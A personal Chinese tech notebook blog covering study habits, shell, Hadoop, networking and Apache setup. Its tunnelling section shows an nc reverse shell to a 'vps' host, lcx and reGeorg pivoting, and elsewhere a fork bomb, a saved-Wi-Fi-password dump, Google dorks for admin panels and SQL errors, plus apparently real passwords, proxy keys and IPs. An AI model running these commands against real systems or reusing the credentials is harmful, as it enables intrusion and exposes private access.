---
title: 葵花宝典
date: 2018-01-26 17:58:25
tags: 笔记
abstract: 用一个简单的文本把每次出错的信息记录下来，后面如果解决了就把解决方法也记录一下，养成这种学习习惯，你会受益匪浅。
---

**用一个简单的文本把每次出错的信息记录下来，**

**后面如果解决了就把解决方法也记录一下，**

**养成这种学习习惯，你会受益匪浅。**



## 每天学点新东西

### 网络编程小作业

实现一个telnet版本的聊天服务器，主要有以下需求。

- 每个客户端可以用使用`telnet ip:port`的方式连接到服务器上。
- 新连接需要用用户名和密码登录，如果没有，则需要注册一个。
- 然后可以选择一个聊天室加入聊天。
- 管理员有权创建或删除聊天室，普通人员只有加入、退出、查询聊天室的权力。
- 聊天室需要有人数限制，每个人发出来的话，其它所有的人都要能看得到。

实现一个简单的HTTP服务器，主要有以下需求。

- 解释浏览器传来的HTTP协议，只需要处理URL path。
- 然后把所代理的目录列出来。
- 在浏览器上可以浏览目录里的文件和下级目录。
- 如果点击文件，则把文件打开传给浏览器（浏览器能够自动显示图片、PDF，或HTML、CSS、JavaScript以及文本文件）。
- 如果点击子目录，则进入到子目录中，并把子目录中的文件列出来。

实现一个生产者/消费者消息队列服务，主要有以下需求。

- 消息队列采用一个Ring-buffer的数据结构。
- 可以有多个topic供生产者写入消息及消费者取出消息。
- 需要支持多个生产者并发写。
- 需要支持多个消费者消费消息（只要有一个消费者成功处理消息就可以删除消息）。
- 消息队列要做到不丢数据（要把消息持久化下来）。
- 能做到性能很高。



### 学习模板

1. **这个技术出现的背景、初衷和要达到什么样的目标或是要解决什么样的问题**。这个问题非常关键，也就是说，你在学习一个技术的时候，需要知道这个技术的成因和目标，也就是这个技术的灵魂。如果不知道这些的话，那么你会看不懂这个技术的一些设计理念。
2. **这个技术的优势和劣势分别是什么，或者说，这个技术的 trade-off 是什么**。任何技术都有其好坏，在解决一个问题的时候，也会带来新的问题。另外，一般来说，任何设计都有 trade-off（要什么和不要什么），所以，你要清楚这个技术的优势和劣势，以及带来的挑战。
3. **这个技术适用的场景**。任何技术都有其适用的场景，离开了这个场景，这个技术可能会有很多槽点，所以学习技术不但要知道这个技术是什么，还要知道其适用的场景。没有任何一个技术是普适的。注意，所谓场景一般分别两个，一个是业务场景，一个是技术场景。
4. **技术的组成部分和关键点**。这是技术的核心思想和核心组件，也是这个技术的灵魂所在。学习技术的核心部分是快速掌握的关键。
5. **技术的底层原理和关键实现**。任何一个技术都有其底层的关键基础技术，这些关键技术很有可能也是其它技术的关键基础技术。所以，学习这些关键的基础底层技术，可以让你未来很快地掌握其它技术。可以参看我在 CoolShell 上写的 Docker 底层技术那一系列文章。
6. **已有的实现和它之间的对比**。一般来说，任何一个技术都会有不同的实现，不同的实现都会有不同的侧重。学习不同的实现，可以让你得到不同的想法和思路，对于开阔思维，深入细节是非常重要的。

### 英文能力

必须指出，再往下走，有一个技能非常重要，那就是英文。如果对这个技能发怵的话，那么你可能无缘成为一个程序员高手了。因为我们所有的计算机技术全部来自于西方国家，所以如果你要想成为一个高手的话，那么必须到信息的源头去。英文的世界真是有价值的信息的集散地。你可以在那里，到官网上直接阅读手册，到StackOverflow 上问问题，到 YouTube 上看很多演讲和教学，到 GitHub上 参与社区，用 Google 查询相关的知识，到国际名校上参加公开课……

如果你的英文能力有问题的话，那么基本上来说，你无法成为一个高手。因此，学好英文是非常有必要的，我说的不只是读写，还有听和说。相信你在学校里学过英文，有一定的基础。所以，我给你下面的这些建议。

1. 坚持 Google 英文关键词，而不是在 Google 里搜中文。
2. 在 GitHub 上只用英文。用英文写代码注释，写 Code Commit 信息，用英文写 Issue 和 Pull Request，以及用英文写 Wiki。
3. 坚持到 YouTube上每天看5分钟的视频。YouTube上有相关的机器字幕，实在不行就打开字幕。
4. 坚持用英文词典而不是中文的。比如：[剑桥英语词典](https://dictionary.cambridge.org/) 或是 [Dictionary.com](http://www.dictionary.com/) 。你可以安装一个Chrome插件 [Google Dictionary](https://chrome.google.com/webstore/detail/google-dictionary-by-goog/mgijmajocgfcbeboacabfgobmjgjcoja)。
5. 坚持用英文的教材而不是中文的。比如：[BBC 的 Learning English](http://www.bbc.co.uk/learningenglish/) ，或是到一些 ESL网站上看看，如 [ESL: English as a Second Language](https://www.rong-chang.com/) 上有一些课程。
6. 花钱参加一些线上的英文课程，用视频和老外练习。



**如何阅读一份源代码？**

阅读优秀的项目源码是学习他人经验的重要途径。

+ 先跑起来

    一个项目代码能否顺利搭建调试环境，效率大不一样。

    环境尽量精简，以减少调试过程中的干扰信息。

+ 调试手段

    + 加调试语句

        需要了解项目如何开启调试模式、加调试日志。

    + 断点调试



Windows 批量启动脚本

```bash
@echo off
start "" "C:\Program Files\Mozilla Firefox\firefox.exe"
start "" "F:\CTF_Tools\Burp Suite\Burp-loader-keygen.jar"
start "" "C:\Program Files (x86)\VMware\VMware Workstation\vmware.exe"
```



**`sqlite3` 配置**

```shell
sudo apt-get -y install apache2 php7.0 php7.0-sqlite3 libapache2-mod-php
```

创建数据库

```
sqlite3 users.db
.read users.sql
.quit
```





阿里云远程连接密码：**232731**

root j3_1023 wywwzjj j3_0527

`vscode` 配置 滚轮缩放，在 `settings.json` 中添加以下代码即可

```json
"editor.mouseWheelZoom": true
```





下载 `youtube` 视频 

命令行安装 `youtube-dl`



**网卡重启**

```shell
/etc/init.d/network restart
service network restart
# 如果在本机上重启可以用下面命令
ifconfig eth0 down
ifconfig eth0 up
```



MySQL 中 `@` 是用户自己声明的局部变量，`@@` 是系统里的全局变量



我们知道递归的害处，那就是如果递归很深的话，stack受不了，并会导致性能大幅度下降。所以，我们使用尾递归优化技术——每次递归时都会重用stack，这样一来能够提升性能，当然，这需要语言或编译器的支持。Python就不支持。



网络出现故障了，优先从物理层开始排查，越接近应用层越复杂

宽带欠费之后，数据链路层被断开



`tracert` 命令

查看到达目的地所经过的路由及网关



**看已连接过的 wifi 密码**

`windows` 下 `cmd` 只要是 `root` 权限跑起来都可以执行（``powershell` 不行

```shell
for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do  @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear
```

## VS code

> **1、注释：**
>
> 　　**a) 单行注释：[ctrl+k,ctrl+c] 或 ctrl+/**
>
> 　　**b) 取消单行注释：[ctrl+k,ctrl+u] (按下ctrl不放，再按k + u)**
>
> 　　**c) 多行注释：[alt+shift+A]**
>
> 　　**d) 多行注释：**/**

------

> **2、移动行：alt+up/down**
>
> **3、显示/隐藏左侧目录栏 ctrl + b**
>
> **4、复制当前行：shift + alt +up/down**
>
> **5、删除当前行：shift + ctrl + k**
>
> **6、控制台终端显示与隐藏：ctrl + ~**
>
> **7、查找文件/安装vs code 插件地址：ctrl + p**

------

> **8、代码格式化：shift + alt +f**
>
> **9、新建一个窗口 : ctrl + shift + n**
>
> **10、行增加缩进: ctrl + [**
>
> **11、行减少缩进: ctrl + ]**
>
> **12、裁剪尾随空格(去掉一行的末尾那些没用的空格) : ctrl + shift + x**
>
> **13、字体放大/缩小: ctrl + ( + 或 - )**
>
> **14、拆分编辑器 : ctrl + 1/2/3**
>
> **15、切换窗口 : ctrl + shift + left/right**

------

> **16、****关闭编辑器窗口 : ctrl + w**
>
> **17、关闭所有窗口 : ctrl + k + w**
>
> **18、****切换全屏 : F11**
>
> **19、****自动换行 : alt + z**
>
> **20、****显示git : ctrl + shift + g**
>
> **21、****全局查找文件：ctrl + shift + f**
>
> **22、****显示相关插件的命令(如：git log)：ctrl + shift + p**
>
> **23、****选中文字：shift + left / right / up / down**
>
> **24、****折叠代码： ctrl + k + 0-9 (0是完全折叠)**
>
> **25**、***展开代码： ctrl + k + j (完全展开代码)**
>
> **26、删除行 ： ctrl + shift + k**
>
> **27、快速切换主题：ctrl + k / ctrl + t**
>
> **28、快速回到顶部 ： ctrl + home**
>
> **29、快速回到底部 : ctrl + end**
>
> **30、格式化选定代码 ：ctrl + k / ctrl +f**

## Shell

```shell
#!/bin/bash  定义所用解释器

# 运行
chmod a+x t.sh
./t.sh  # ./ 表示当前目录
/path/to/t.sh  # 使用绝对路径

# echo
echo "hello"  # 允许shell解释字符串中的特殊字符
echo 'hello'  # 不做任何解释，当做纯文本
echo hello
echo -e "\e[1;31m This is red text \e[0m"  # 打印彩色文本

# printf
参数与 c 语言当中的一样，下面是格式化输出
printf  "%-5s %-10s %-4s\n" No Name  Mark  
printf  "%-5s %-10s %-4.2f\n" 1 Sarath 80.3456  
printf  "%-5s %-10s %-4.2f\n" 2 James 90.9989  
printf  "%-5s %-10s %-4.2f\n" 3 Jeff 77.564 

env  # 查看环境变量
生成一份易读的报表，可以将cat命令的输出通过管道传给tr，将其中的\0替换成\n：
cat /proc/12/environ | tr '\0' '\n'

# 变量
varName=value  # 如果 value 不包含任何空白字符，那就不需要放到引号中
echo $varName
echo ${varName}

# 数组
arr=(1 2 3 4)

# 函数
声明
function fname() {
    statements;
}

fname() {
    statements;
}

name() {statements;}

调用
$fname ;
fname arg1 arg2 ; # 传递参数

访问参数（按位置访问 $0 为脚本名称 $n 是第n个参数）
fname() {
    echo $1, $2;  # 访问参数1、2
    echo "$@";    # 以列表的方式一次性打印所有参数
    echo "$*";    # 类似上面那条
}

fork 炸弹
:(){ :|:& };:

var=1232342342345324
len=${#var}  # 获得字符串长度

# 获得当前shell名称
echo $SHELL
echo $0

# 文件描述符与重定向
0 stdin （标准输入		1 stdout（标准输出		2 stderr（标准错误
stdout
> 重定向（会覆盖）
>> 重定向追加

stderr
# 以下的 + 只是随便打的一个字符，只是为了构造出错误
➜  ~ ls + > out.txt
ls: cannot access '+': No such file or directory
ls + 2> out.txt  # 成功
ls + 2>stderr.txt 1>stdout.txt  # 分别定向到不同文件

# 将 stderr 转为 stdout，都重定向的文件中
ls + 2>&1 alloutput.txt  
ls &> output.txt


sed(行的增删改查)
awk(划分列的好帮手)
cut (截取利器)
grep(过滤神器)


cmd < file  # 将文件重定向到命令
可自定义文件描述符

tee -a  # 追加

# 别名
alias new_command='command sequence'  # 这只是暂时的，永久需加入 ~/.bashrc
alias rm='cp $@ ~/backup && rm $@'
echo alias new_command='command sequence' >> ~/.bashrc
删除别名，直接删除对应的定义，或者 unalias 
也可以 alias example=  即为空

tput  # 设置终端

bash -x script.sh  # 启用脚本跟踪调试功能，打印每一行命令及当前状态
#!/bin/bash -xv
#文件名: debug.sh 
for i in {1..6}; 
do     
    set -x     
    echo $i     
    set +x 
done 
echo "Script executed" 

script 录制终端
$script -t 2> timing.log -a output.session  # 录制
exit  # 停止录制
scriptreplay timing.log output.session  # 播放


wget 下载 web 界面或远程文件
wget http://www.knopper.net -O knopper.html 
wget ftp://ftp.example.com/somefile.img -O dloaded_file.img -o log 

# 断点续传
wget -c URL 

# 复制整个网站
wget --mirror --convert-links exampledomain.com 
wget -r -N -l -k DEPTH URL 

# 以纯文本形式下载页面
lynx url -dump > webpage_as_text.txt

curl
# 设置http头
curl --referer Referer_URL target_URL 
curl http://example.com --cookie "user=username;pass=hack" 
curl url --cookie-jar cookie_file  # 将cookie另存为文件
curl URL --user-agent "Mozilla/5.0" 
curl -H "Host: www.knopper.net" -H "Accept-language: en" URL

# 只打印http头部
curl -I http://knopper.net 

# 认证
curl -u user:pass http://test_auth.com 


端口转发
# 本地8000转远端
ssh -L 8000:www.kernel.org:80 user@localhost
# 远端8000转本地
ssh -L 8000:www.kernel.org:80 user@remote_machine

# 后台开启（非交互式）
ssh -fL8000:www.kernel.org:80 user@localhost -N 

# 反向端口转发
ssh -R 8000:localhost:80 user@REMOTE_MACHINE 
上述命令会将远程主机端口8000上的流量转发到本地主机的端口80上。
```



## Scala

官网 、源码

安装 https://downloads.lightbend.com/scala/2.11.8/scala-2.11.8.tgz



## Hadoop

#### 坑点

+ spark Caused by: java.lang.NoClassDefFoundError: org/slf4j/Logger

    https://spark.apache.org/docs/latest/hadoop-provided.html

+ port 50070 changed to 9870 in 3.0.0-alpha1

    出现以下信息即配置好伪分布式，不需要出现 successful

```shell
$jps
3648 DataNode
3941 Jps
2678 NameNode
3095 SecondaryNameNode
```
```shell
sudo apt install openjdk-11-jdk

# 配置环境变量 ~/.bashrc
export JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64
export JRE_HOME=${JAVA_HOME}/jre
export HADOOP_HOME=/usr/local/hadoop
export CLASSPATH=.:${JAVA_HOME}/lib:${JRE_HOME}/lib
export PATH=${JAVA_HOME}/bin:${HADOOP_HOME}/bin:${HADOOP_HOME}/sbin:$PATH
```

#### 常用命令

```shell
./sbin/stop-dfs.sh  # 关闭Hadoop
./sbin/start-dfs.sh  # 开启Hadoop
```



#### HDFS(分布式存储)

#### MapReduce(分布式处理)



## Spark

#### 笔记

Spark 包含了大数据领域常见的各种计算框架：

+ Spark Core 用于离线计算
+ Spark SQL 用于交互式查询
+ Spark Streaming 用于实时流式计算
+ Spark MLlib 用于机器学习
+ Spark GraphX 用于图计算

#### 环境搭建

[ubuntu18.04环境下hadoop3.1,spark虚拟机分布式安装笔记](https://blog.csdn.net/wangxn216/article/details/80095710)



## 内网穿透

**最简单的办法**

[win10 openssh](https://kheresy.wordpress.com/2017/12/14/windows-begin-to-provide-ssh-client-and-server/)

```shell
# win
ssserver -p 2333 -k rois2018 -m aes-256-cfb  # 跑shadowsocks
ssh -R 0.0.0.0:2333:localhost:2333 wywwzjj@35.201.152.114  # ssh设置
# 

# vps
```

+ lcx.exe

    ```shell
    # 内网端口转发
    lcx.exe -slave vps 2333 127.0.0.1 3389  # 把主机 3389 端口转发到 vps 2333 端口
    lcx.exe -listen 2333 4444  # 监听 2333 端口，并将 2333 请求转发给 4444 端口
    
    # 本地端口转发
    lcx.exe -tran 21 ip 3389  # 将 3389 端口转发到 21 端口
    ```

+ earthworm

    升级版：termite

+ s5.py

    配合 Proxifier 一起使用

+ nc

    ```shell
    # 反向连接
    nc -lvvvp 2333  # vps 开启监听
    nc -t -e cmd.exe vps 2333  # -t 通过 Telnet 模式执行 cmd.exe
    
    # 正向代理
    nc -lp 2333 -t -e cmd.exe  # vps
    nc -vv vps 2333  # 本地
    ```

    

+ reGeorg

    通过 `webshell` 建立一个 `socks` 代理进行内网穿透

+ ngrok

#### 服务器端:（只用ssh映射，不用跑shadowsocks）

```shell
ssh -R 0.0.0.0:2333:localhost:2333 root@120.79.1.209

vi /etc/ssh/sshd_config
添加一行 //添加GatewayPorts yes  # 使服务器的ssh允许转发0.0.0.0

netstat -an | grep 2333  # 查看端口转发情况
ufw allow 2333    # 防火墙打开端口，记得打开阿里云官网的防火墙端口
service sshd restart
```

#### 内网端（跑shadowsocks）
```shell
ssserver -p 2333 -k login_233 -m aes-256-cfb  # 跑shadowsocks
ssh -R 0.0.0.0:2333:localhost:2333 root@120.79.1.209  # ssh设置
```
#### 访问
```shell
sslocal -s 35.201.152.114 -p 2333 -k 123456 -m aes-256-cfb -l 1082
//第三方进行
//测试端口
```

### 小问题

出现 问题 ssserver 无法打开
原因：本文适用于解决openssl升级到1.1.0以上版本，导致shadowsocks2.8.2启动报undefined symbol: EVP_CIPHER_CTX_cleanup错误。
解决https://blog.csdn.net/vbaspdelphi/article/details/72993626

Xshell ssh 隧道

proxychains in Linux

Proxifier in Windows

不得不说这个工具是一个神器，他能真正的实现全局的代理，你系统得每一个访问他都能代理，不仅如此，他还可以自己选择想要代理的任何软件，非常的方便，于是他也就成了windows下代理的神兵利器。

```shell
ssh 10.105.1.30 -lattacker -D1082 -L0.0.0.0:1994:10.105.1.14:80 -L0.0.0.0:1998:10.105.1.18:22 -L0.0.0.0:1993:10.105.1.13:80 -L0.0.0.0:1992:10.105.1.12:80 -R0.0.0.0:80:0.0.0.0:80
```

[reGeorg](https://github.com/sensepost/reGeorg)

clash

[ew](http://rootkiter.com/EarthWorm/)

frp 

暴露内网 ssh

```shell
# frpc.ini
[common]
server_addr = 47.101.220.241
server_port = 9000

[ssh]
type = tcp
local_ip = 127.0.0.1
local_port = 22
remote_port = 6000

# frps.ini
[common]
bind_port = 9000

ssh -oPort=6000 test@x.x.x.x
```

[Frp后台自动启动的几个方法](<https://blog.csdn.net/x7418520/article/details/81077652>)

```
sudo vim /lib/systemd/system/frps.service 
```


在frps.service里写入以下内容

```
[Unit]
Description=FRP Server Daemon
After=network.target syslog.target
Wants=network.target

[Service]
Type=simple
#启动服务的命令（此处写你的frps的实际安装目录）
ExecStart=/your/path/frps -c /your/path/frps.ini

[Install]
WantedBy=multi-user.target
```

frpc.service 要这么写才能自启动？

```
[Unit]
Description=FRP Client Daemon
After=network.target
Wants=network.target

[Service]
Type=simple
ExecStart=/usr/sbin/frp/frpc -c /etc/frp/frpc.ini
Restart= always
RestartSec=1min
ExecStop=/usr/bin/killall frpc


[Install]
WantedBy=multi-user.target
```



然后就启动frps 
sudo systemctl start frps 
再打开自启动 
sudo systemctl enable frps

如果要重启应用，可以这样，sudo systemctl restart frps
如果要停止应用，可以输入，sudo systemctl stop frps

如果要查看应用的日志，可以输入，sudo systemctl status frps

## Google hacking

常用语法备忘

```shell
site		指定域名
inurl		url 中存在关键字的网页
intitle		网页标题中的关键字
intext		网页正文中的关键字
filetype	指定文件类型
link		link:baidu.com 即表示返回所有和 baidu.com 做了链接的 URL
info		查找指定站点的一些基本信息
cache 		搜索 Google 里关于某些内容的缓存
```

实例

```shell
# 数据库报错
site:xx.com
intext:"sql syntax near"intext:"syntax error has occurred"intext:"incorrect syntax near"intext:"unexpected end of SQL command"intext:"Warning: mysql_connect()"intext:"Warning: mysql_query()"intext:"Warning: pg_connect()"

# 找后台
site:target.com intitle:"后台|登录|登陆|验证码|管理员|服务系统|系统登录|认证码|验证身份|管理系统|管理后台|管理平台|mgmt|sysadmin|admin|password|login|manage

# 找敏感文件
site:target.com filetype: doc | docx | pdf | xls | xlsx | ppt | pptx

找目录遍历漏洞

intext:转到父目录

intext:index of

intitle:index of

intext:Parent Directory
```



## phpstudy

https://www.cnblogs.com/jewave/p/5625878.html
http://www.keydatas.com/html/apache.html?audience=320658

## Network

### 杂项

流量分类

+ 广播

    广播数据包将发送到一个网段的所有端口

+ 多播 = 组播

    将单一来源数据包同时传输给多个目标。

    实现的主要方式是将数据包接受者加入多播组的编制方案。

+ 单播

    一对一


计算机网络 = 通信技术 + 计算机技术

协议三要素：

+ 语法
+ 语义
+ 顺序

只有通过网络协议，才能使一大片机器互相协作、共同完成一件事。

**动态主机配置协议（DHCP）**

动态主机配置协议（Dynamic Host Configuration Protocol），简称 DHCP，使用 UDP 协议工作。没有分配 IP 之前，使用的是 MAC 地址，这是它唯一的身份。

DHCP 的方式就相当于租房。你不用装修，都是给你配置好的。你暂时用一下，用完退租就可以了。如果还要续租，就得提前给房东说。客户机会在租期过去 50% 的时候，直接向为其提供 IP 地址的 DHCP Server 发送 DHCP request 消息包。客户机接收到该服务器回应的 DHCP ACK 消息包，会根据包中所提供的新的租期以及已经更新的 TCP/IP 参数，更新自己的配置。这样，IP 租用更新就完成了。

![](http://ww1.sinaimg.cn/large/de75fd55gy1g1n1yxbbsqj20d80b83ys.jpg)

有趣的是，网络管理员不仅能自动分配 IP 地址，还能帮你自动安装操作系统！

**预启动执行环境（PXE）**

数据中心的管理员可能一下子就拿到几百台空的机器，一个个安装操作系统，会累死的。所以管理员希望的是不仅仅自动分配 IP 地址，还要自动安装系统。

这个过程和操作系统启动的过程有点像。首先，启动 BIOS。这是一个特别小的小系统，只能干特别小的一件事情。其实就是读取硬盘的 MBR 启动扇区，将 GRUB 启动起来；然后将权力交给 GRUB，GRUB 加载内核、作为根文件系统的 initramfs 文件；然后将权力交给内核；最后内核启动，初始化整个操作系统。

那我们安装操作系统的过程，只能插在 BIOS 启动之后了。因为没安装系统之前，连启动扇区都没有。因而这个过程叫做**预启动执行环境（Pre-boot Execution Environment）**，简称 PXE。

![](https://static001.geekbang.org/resource/image/6e/a4/6e69007db3fc68ff6da8496266abf6a4.jpg)

如何配置 IP 地址？

```shell
# net-tools
sudo ifconfig eth1 10.0.0.1/24
sudo ifconfig eth1 up

# iproute2
sudo ip addr add 10.0.0.1/24 dev eth1
sudo ip link set up eth1
```



Linux 默认的逻辑是，如果这是一个跨网段的调用，它便不会直接将包发到网络上，而是企图将包发送到网关。（如果非跨网段，则通过 ARP 协议发送广播包，拿到目标 IP 所对应的 Mac 地址，然后通过 Mac 直接发过去？）那 win server 呢？

### 思考

+ 当网络包到达一个城关的时候，可以通过路由表得到下一个城关的 IP 地址，直接通过 IP 地址找就可以了，为什么还要通过本地的 MAC 地址呢？

    在路由间跳转时，源 MAC、目标 MAC 地址一直在变，源 IP、目标 IP 只是拿出来看看，确定大方向。

    对于 MAC 和 IP，在局域网内，MAC 是相对固定和唯一的，如果不唯一将出现通信故障，连不上网；而局域网内的 IP 是交由 DHCP 服务器进行分配。路由器设置页面中有 DHCP 服务器的设置，其中地址租期的设置很重要，决定了你这个地址最长能使用多久，无论是否有设备占用，一旦超过限制时间，将会重新分配，以提高 IP 地址的使用率。

    早期的以太网只有交换机，没有路由器，以太网通过 MAC 进行通信。能否全球范围内使用 MAC 进行通信呢？答案是否定的，尽管 MAC 地址是唯一的，但仍然无法通过 MAC 确定你在网络中所处的位置，例如，寻址如何寻？建立一个超大的 MAC 地址对应表？IP 地址就解决了这个问题，IP 是网络提供商给的，你在哪个位置，整个互联网都知道。

+ 网络为什么要分层



### OSI 模型

#### 应用层

>  DHCP  DNS  HTTP  HTTPS  RTMP  P2P  GTP  RPC

所有能产生网络流量的程序。

发送 HTTP 报文

```
POST /index.php?c=user&a=login HTTP/1.1
Host: www.ganju8862.cn
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://www.ganju8862.cn/auth/login?t=1554047797333
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Connection: close
Cookie: PHPSESSID=il9qpkcn73onl8mfb3htg85ju7

password=*&rememberMe=true&username=*
```



#### 表示层

在传输之前是否进行加密、压缩、二进制或 ASCII 编码等处理



#### 会话层

一个网页加载过程中开启一个会话，防止与其他进程混淆



#### 传输层

> 段：UDP 17  TCP 6

操作系统往往通过端口来判断，它得到的包应该给哪个进程。

##### UDP

**特点**

+ 无连接，即发送数据之前不需要建立连接

+ 一个数据包就能完成数据通信，不分段
+ 面向报文，不保证可靠交付，不使用拥塞控制，可一对多，适合多谋体通信
+ 首部简单，只有 8 字节

##### TCP

**特点**

+ 需要将传输的文件分段
+ 面向连接，建立会话，每条 TCP 连接只能是点对点（一对一）
+ 流量控制，拥塞控制
+ 提供可靠交付、全双工通信，面向字节流

**重点关注**

+ 顺序问题，稳重不乱
+ 丢包问题，承诺靠谱
+ 连接维护，有始有终
+ 流量控制，把握分寸
+ 拥塞控制，知进知退




#### 网络层

> 包 ：ICMP 1  IGMP 2  IP  RIP OSPF 89  BGP  IPSec  GRE

基于数据包的 IP 地址，负责在不同网段间尽力转发数据包，不保证数据不丢失，不负责顺序，

负责选择最佳路径，规划 `IP` 地址。

![](http://ww1.sinaimg.cn/large/de75fd55gy1g2nvqensdcj20jg0djjwz.jpg)

区分服务，Qos 优先发送？



链路层通常对可传输的每个帧的最大长度都有一个上限。为了保持 IP 数据报抽象与链路层细节的一致和分离，IP 层引入了分片和重组。当 IP 层收到一个要发送的数据报时，会先查找本地接口对应的 MTU，过大则开始分片，然后到目的地后再进行重组。标志表示有无分片，标识表示分片的编号，片偏移表示分片的相对位置？（泪滴攻击）



TTL 每过一个路由就减一。



首部检验和用来验证首部有无变化，不验证数据部分。



IPv4 可选字段默认为空，用于扩展功能，用的太少，IPv6 已经去掉了。



在之前的包中添加上当前 `IP` 和目标 `IP` 。操作系统拿到目标 `IP` 后，就开始寻找，它会先判断是本地的，还是外地的，如果是外地的，则发给网关，那如何才能找到网关呢？通过 `ARP` 协议一声吼，找到网关的 `MAC` 地址。网关收到包后，会根据自己的知识，判断下一步该怎么走。网关往往是一个路由器，到某个 IP 地址应该怎么走，这个叫做**路由表**。路由器有点像玄奘西行路过的一个个国家的一个个城关。每个城关都连着两个国家，每个国家相当于一个局域网，在每个国家内部，都可以使用本地的地址 MAC 进行通信。一旦跨越城关，就需要拿出 IP 头来，里面写着贫僧来自东土大唐（源 IP），欲往西天取经（目标 IP）。路过宝地，借宿一晚，明日起行，请问接下来该怎么走。感觉使用地铁站换乘要更贴切？

到哪里应该怎么走，这种沟通的协议称为路由协议，常用的有 `OSPF` 和 `BGP`。

直到数据包走到最后一个城关，这时候，城关会对着这个国家吼一声，谁是目标 IP 啊？目标服务器就会回复一个 MAC 地址。网络包过关后，通过这个 MAC 地址就能找到目标服务器。

目标服务器拿到数据包后就开始“逆向”，一层一层剥开，直到拿到最初的请求包。

目标服务器发现 MAC 地址对上了，确实要来我这里，然后取下 MAC 头来，发送给操作系统的网络层。发现 IP 也对上了，就取下 IP 头。IP 头里会写上一层封装的是 TCP 协议，然后将其交给传输层，即 TCP 层。到 TCP 层之后会回一个消息 `ACK` 报平安，证明数据包已经收到。



能用来寻路的路由协议统称为 IP 协议，分为动态路由、静态路由。



#### 数据链路层

>  帧：ARP  VLAN  STP

![](http://ww1.sinaimg.cn/large/de75fd55gy1g2nw54sie3j20mh0bojw0.jpg)



线路拥堵时，交换机会缓存数据，等会再发（存储转发）。

+ 封装成帧

    数据帧里的 ip 地址负责记录起点和终点，Mac 地址负责下一跳给谁

+ 透明封装

+ 无差错检验
+ 点到点线路的数据链路层 PPP
+ 广播信道的数据链路层 CSMA / CD

#### 物理层

>  比特流：网络跳线

+ 网络设备的机械特性、功能特性、电气标准和过程特性

+ 数据通信基础知识
    + 数字信号
    + 模拟信号

+ 频分多路复用

+ 时分多路复用



### Socket 编程

![](http://ww1.sinaimg.cn/large/de75fd55gy1g2j9nl8ok2j20n00ejgsb.jpg)

API：应用进程的控制权和操作系统的控制权进行转换的一个系统调用接口。

socket 

+ 对外：ip + port
+ 对内：操作系统分配一个数据结构存储套接字相关信息，返回套接字描述符

### 路由表配置

必须要学会配路由，使得内网和外网同时能访问

windows下配路由表利器：NetRouteView 

```shell
无线网卡：11
有线网卡：4
route print / netstat -r  # 显示本地路由表
route add 0.0.0.0 mask 0.0.0.0 192.168.0.1 METRIC 1 IF 12  # 全局
# 192.168.0.1 设置无线网卡的网关，12 是无线网卡的 ID
route add 10.0.0.0 mask 255.0.0.0 xxx IF 5  # 上内网
# xxx 设置为 OpenVPN（有线网卡） 网关，5 为 OpenVPN（有线网卡）ID(TAP)

# 配错了的话
route delete 0.0.0.0 / 10.0.0.0

:删除默认设置
route delete 0.0.0.0
:外网路由，全走无线
route add 0.0.0.0 mask 0.0.0.0 192.168.0.1  # -p 永久路由
:公司内网全部在10.108.*.*网段，增加此路由
route add 10.108.0.0 mask 255.255.0.0 10.108.58.1

route add 134.105.0.0 mask 255.255.0.0 134.105.64.1
意思是：所有需要发往 134.105.0.0/16 地址段的IP数据包，全部由 134.105.64.1 转发。
```

## Nginx



## Apache

### CORS 配跨域

```shell
# 配置目录，不需要找什么 httpd.conf
/etc/apache2/
|-- apache2.conf
|       `--  ports.conf
|-- mods-enabled
|       |-- *.load
|       `-- *.conf
|-- conf-enabled
|       `-- *.conf
`-- sites-enabled
        `-- *.conf

# 常用管理命令
sudo systemctl 
stop / start / restart / reload / disable / enable
apache2

# 开启虚拟主机
sudo mkdir /var/www/example.com/
sudo chown -R $USER:$USER /var/www/example.com
sudo chmod -R 755 /var/www/example.com

# 创建虚拟主机文件，尽量不要直接改动 000-default.conf
sudo vim /etc/apache2/sites-available/example.com.conf
<VirtualHost *:80>
    ServerAdmin admin@example.com
    ServerName example.com
    ServerAlias www.example.com
    DocumentRoot /var/www/example.com/html
    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

# 还有这种
<VirtualHost *:8000>
    DocumentRoot "/home/admin/tp5/public"
    ServerName 007.liangyishipin.com:8000
    <Directory "/home/admin/tp5">
        Options FollowSymLinks Indexes
        Require all granted
        AllowOverride All
    </Directory>
</VirtualHost>

# 激活
sudo a2enconf example.com.conf

# 禁用默认站点
sudo a2dissite 000-default.conf

# 测试配置是否正确
sudo apache2ctl configtest

# 设置跨域，添加语句到 apache2.conf Directory (全局) / xxx.conf VirtualHost (指定网站) 
Header set Access-Control-Allow-Origin * 

# 这一切都很完美，重启一下 Apache，直接挂掉
# 我一度怀疑我是不是配错了，具体错误还是得看报错信息
Invalid command 'Header', perhaps misspelled or defined by a module

sudo a2enmod headers
# 重启，一切恢复正常，爽~
```

### 内容

- `/var/www/html` ：默认情况下，实际的网页内容仅包含您之前看到的默认Apache页面，它将在`/var/www/html`目录中提供。 这可以通过修改Apache配置文件来改变。

### 服务器配置

- `/etc/apache2` ：Apache配置目录。 所有的Apache配置文件都驻留在这里。
- `/etc/apache2/apache2.conf` ：主要的Apache配置文件。 可以修改这个以更改Apache全局配置。 该文件负责加载配置目录中的许多其他文件。
- `/etc/apache2/ports.conf` ：该文件指定了Apache将监听的端口。 默认情况下，当启用提供SSL功能的模块时，Apache监听端口80，并在端口443上监听。
- `/etc/apache2/sites-available/` ：可以存储每个站点虚拟主机的目录。 除非链接到`sites-enabled`目录，否则Apache不会使用此目录中的配置文件。 通常，所有服务器块配置都在此目录中完成，然后通过使用`a2ensite`命令链接到其他目录来启用。
- `/etc/apache2/sites-enabled/` ：存储已启用每站点虚拟主机的目录。 通常，这些是通过链接到`a2ensite`的`sites-available`目录中的配置文件创建的。 Apache在启动或重新加载以编译完整配置时读取此目录中的配置文件和链接。
